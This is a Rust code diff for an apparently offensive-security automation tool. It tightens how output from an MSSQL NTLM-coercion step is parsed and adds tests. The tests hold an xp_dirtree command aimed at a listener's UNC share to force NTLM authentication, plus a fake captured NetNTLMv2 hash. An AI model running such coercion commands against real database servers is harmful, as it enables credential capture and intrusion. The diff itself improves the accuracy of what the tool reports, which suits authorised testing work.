@@ -226,6 +226,23 @@ fn is_unauth_harvest_tool(tool_name: &str) -> bool {
     )
 }
 
+fn xp_dirtree_executed(output: &str) -> bool {
+    const FAILURE_MARKERS: &[&str] = &[
+        "login failed",
+        "permission was denied",
+        "connectionrefusederror",
+        "tds connect",
+        "connection error",
+        "timed out",
+    ];
+
+    let lower = output.to_ascii_lowercase();
+    if FAILURE_MARKERS.iter().any(|m| lower.contains(m)) {
+        return false;
+    }
+    lower.contains("subdirectory")
+}
+
 /// True when a harvest tool's parsed `discoveries` carry at least one
 /// credential, hash, or newly-enumerated user — i.e. the run produced
 /// something the operation can act on.
@@ -876,16 +893,12 @@ pub fn parse_tool_output(tool_name: &str, output: &str, params: &Value) -> Value
             }
         }
         "mssql_ntlm_coerce" => {
-            let hashes = secrets::parse_netntlmv2(output, params, "mssql_ntlm_coerce");
-            if !hashes.is_empty() {
-                discoveries["hashes"] = Value::Array(hashes);
-            }
             let target = params.get("target").and_then(|v| v.as_str()).unwrap_or("");
             let listener_ip = params
                 .get("listener_ip")
                 .and_then(|v| v.as_str())
                 .unwrap_or("");
-            if !target.is_empty() && !listener_ip.is_empty() {
+            if !target.is_empty() && !listener_ip.is_empty() && xp_dirtree_executed(output) {
                 let target_safe = target.replace('.', "_");
                 let listener_safe = listener_ip.replace('.', "_");
                 let vuln = json!({
@@ -2718,19 +2731,91 @@ Starting mitm6 using the domain: contoso.local
     }
 
     #[test]
-    fn parse_tool_output_mssql_ntlm_coerce_survives_empty_output() {
+    fn parse_tool_output_mssql_ntlm_coerce_claims_nothing_from_empty_output() {
         let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
         let disc = parse_tool_output("mssql_ntlm_coerce", "", &params);
-        assert_eq!(
-            disc["vulnerabilities"].as_array().unwrap()[0]["vuln_type"],
-            "coercion_attempted"
+        assert!(
+            disc.get("vulnerabilities").is_none(),
+            "no result set means xp_dirtree never ran — a marker here is built only from params"
         );
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_claims_nothing_when_login_refused() {
+        let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
+        let output = "[-] ERROR(SQL01): Line 1: Login failed for user 'CONTOSO\\alice'.";
+        let disc = parse_tool_output("mssql_ntlm_coerce", output, &params);
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_claims_nothing_when_proc_denied() {
+        let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
+        let output = "[-] ERROR(SQL01): Line 1: The EXECUTE permission was denied on the object 'xp_dirtree', database 'mssqlsystemresource', schema 'sys'.";
+        let disc = parse_tool_output("mssql_ntlm_coerce", output, &params);
+        assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_claims_nothing_when_tds_connect_fails() {
+        let params = json!({"target": "192.168.58.30", "listener_ip": "192.168.58.5"});
+        let output = "[-] ConnectionRefusedError: [Errno 111] Connection refused";
+        let disc = parse_tool_output("mssql_ntlm_coerce", output, &params);
+        assert!(disc.get("vulnerabilities").is_none());
     }
 
     #[test]
     fn parse_tool_output_mssql_ntlm_coerce_skipped_when_params_missing() {
         let disc = parse_tool_output("mssql_ntlm_coerce", "", &json!({}));
         assert!(disc.get("vulnerabilities").is_none());
+    }
+
+    const LISTENER_SIDE_NETNTLMV2: &str = "[SMB] NTLMv2-SSP Hash     : SQL01$::CONTOSO:1122334455667788:aabbccddeeff00112233445566778899:0101000000000000000102030405060708090a";
+
+    #[test]
+    fn netntlmv2_fixture_is_extractable_by_a_listener_side_parser() {
+        let params = json!({"domain": "contoso.local"});
+        let disc = parse_tool_output("start_mitm6", LISTENER_SIDE_NETNTLMV2, &params);
+        let hashes = disc["hashes"].as_array().expect("hashes");
+        assert_eq!(hashes.len(), 1);
+        assert_eq!(hashes[0]["username"], "SQL01$");
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_claims_no_hash_from_listener_side_capture() {
+        let params = json!({
+            "target": "192.168.58.30",
+            "listener_ip": "192.168.58.5",
+            "domain": "contoso.local",
+        });
+        let disc = parse_tool_output("mssql_ntlm_coerce", LISTENER_SIDE_NETNTLMV2, &params);
+        assert!(disc.get("hashes").is_none());
+        assert!(
+            disc.get("vulnerabilities").is_none(),
+            "a raw listener capture is not xp_dirtree output — this tool never sees it"
+        );
+    }
+
+    #[test]
+    fn parse_tool_output_mssql_ntlm_coerce_claims_no_hash_from_mssqlclient_result_set() {
+        let output = format!(
+            "SQL (CONTOSO\\svc_sql  dbo@master)> EXEC master..xp_dirtree '\\\\192.168.58.5\\share'\n\
+             subdirectory       depth\n\
+             --------------     -----\n\
+             {LISTENER_SIDE_NETNTLMV2}\n"
+        );
+        let params = json!({
+            "target": "192.168.58.30",
+            "listener_ip": "192.168.58.5",
+            "domain": "contoso.local",
+        });
+        let disc = parse_tool_output("mssql_ntlm_coerce", &output, &params);
+        assert!(disc.get("hashes").is_none());
+        assert_eq!(
+            disc["vulnerabilities"].as_array().expect("vulns")[0]["vuln_type"],
+            "coercion_attempted",
+            "the result-set header proves xp_dirtree ran, so the marker stands"
+        );
     }
 
     /// The wiring that keeps a successful forge from being scored as a failure:
